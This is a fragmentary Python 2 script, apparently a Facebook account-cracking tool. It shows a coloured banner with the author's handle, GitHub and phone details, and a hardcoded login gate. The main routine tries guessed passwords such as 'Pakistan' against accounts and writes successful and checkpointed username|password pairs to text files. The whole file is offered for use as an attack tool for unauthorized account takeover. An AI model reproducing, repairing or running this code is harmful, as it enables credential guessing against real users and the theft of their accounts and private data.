...
`-' `-'`-'  `-'`-'  `-'`-'                             
\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mHAMI
\033[1;96mpage \033[1;93m: \033[1;92HAMI
\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/HAMI-CODER
\033[1;96mFB \033[1;93m: \033[1;92mHAMAD MALIK
\033[1;91m======================================="""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
print  """ \x1b[1;91m======================================="""
\033[1;96mAuthor  \033[1;93m: \033[1;92mHAMI
\033[1;96mPage \033[1;93m: \033[1;92mHAMI
\033[1;96mGitHub  \033[1;93m: https://github.com/
\033[1;96mwp \033[1;93m: +9203025604966
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="
CorrectUsername = "HaMi"
CorrectPassword = "XD-CODER"
loop = 'true'
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            os.system('xdg-open https://www.facebook.com/113736350980897/posts/122145413473324/?app=fbl')
    else:
...
def login():
	...
	try:
		...
		if 'checkpoint' in url:
			print("\n\033[1;96m \x1b[1;91mIt seems that your account has a loading")
...
def menu():
	...
	try:
		...
		os.system('clear')
		print"\033[1;96m \033[1;91mIt seems that your account has a loading"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
...
def pilih_super():
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;92msuccessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									oks= open("avs/successfull.txt", "a")
									oks.write(user+"|"+pass3+"\n")
									oks.close()
									okb.append(user+pass3)
								else:
									pass4 = 'Pakistan'
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;92msuccessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											oks= open("avs/successfull.txt", "a")
											oks.write(user+"|"+pass4+"\n")
											oks.close()
											okb.append(user+pass4)
										else:
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;91mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cps= open("avs/successfull.txt", "a")
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	cps= open("avs/checkpoint.txt", "a")
	...
	print("\033[1;96m[+] \033[1;92m THANKS FOR USING MY COMMAND ! WE WILL RIGHT BACK  \033[1;91m: \033[1;97msuccessfull/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
